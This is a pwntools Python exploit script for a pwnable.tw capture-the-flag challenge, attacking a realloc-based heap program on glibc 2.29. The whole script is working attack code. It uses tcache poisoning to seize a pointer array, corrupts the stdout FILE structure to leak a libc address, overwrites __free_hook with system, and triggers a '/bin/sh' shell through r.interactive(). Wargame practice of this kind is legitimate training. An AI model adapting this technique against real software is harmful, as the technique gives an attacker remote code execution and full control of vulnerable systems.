from pwn import *

###Util
def create(idx,size,data):
    r.sendlineafter('choice: ','1')
    r.sendlineafter('Index:',str(idx))
    r.sendlineafter('Size:',str(size))
    r.sendafter('Data:',data)

def realloc(idx,size,data):
    r.sendlineafter('choice: ','2')
    r.sendlineafter('Index:',str(idx))
    r.sendlineafter('Size:',str(size))
    if size!=0:
        r.sendafter('Data:',data)
    
def delete(idx):
    r.sendlineafter('choice: ','3')
    r.sendlineafter('Index:',str(idx))

###Addr
#  libc2.29
heap_array = 0x4040b0
stdout_struct_offset = 0x1e5760
stdout_shortbuf_offset = stdout_struct_offset+0x83
free_hook_offset = 0x1e75a8
system_offset = 0x52fd0

###Exploit
while True:
    r = remote('chall.pwnable.tw',10106)
    create(1,0x68,'M30W')
    create(0,0x68,'M30W')
    delete(1)
    realloc(0,0,None)
    realloc(0,0x78,p64(heap_array-0x8))
    create(1,0x68,'M30W')
    delete(0)
    create(0,0x68,p64(0x61)+p64(heap_array)+p64(0)*10+p64(0x21))
    delete(0)
    create(0,0x58,p64(heap_array))

    create(1,0x28,p64(0)*0x3+p64(0x71))
    delete(1)

    create(1,0x58,'M30W')
    delete(1)
    for i in range(10):
        print('>>',i)
        create(1,0x78,'M30W')
        realloc(0,0x58,p64(heap_array)+p64(0))
    create(1,0x58,'M30W')
    realloc(1,0,None)
    realloc(0,0x58,p64(heap_array)+b'\x70')
    realloc(1,0x68,p64(0)+p64(0x461))
    realloc(0,0x58,p64(heap_array)+b'\x80')
    delete(1)
    create(1,0x28,p64(0)*0x3+p64(0x71))
    realloc(0,0x58,p64(heap_array)+b'\x70')
    realloc(1,0x68,p64(0)+p64(0x61))
    realloc(0,0x58,p64(heap_array)+b'\x80')
    realloc(1,0x58,b'\x60\xd7')
    realloc(0,0x58,p64(heap_array)+p64(0))
    create(1,0x58,p64(0)+p64(0x21))
    realloc(0,0x58,p64(heap_array)+p64(0))
    try:
        create(1,0x58,p64(0xfbad3887)+p64(0)*3)
        stdout_shortbuf_addr = u64(r.recvline()[0x88:0x90])
    except:
        r.close()
        continue
    libc_base = stdout_shortbuf_addr-stdout_shortbuf_offset
    print(hex(libc_base))

    realloc(0,0x58,p64(heap_array)+p64(heap_array+0x20)+p64(0)+p64(0x31))
    delete(1)
    realloc(0,0x58,p64(heap_array)+p64(0)*2+p64(0x31)+p64(libc_base+free_hook_offset-8))
    create(1,0x28,'M30W')
    realloc(0,0x58,p64(heap_array)+p64(0))
    create(1,0x28,b'/bin/sh\x00'+p64(libc_base+system_offset))
    delete(1)
    r.interactive()
    break
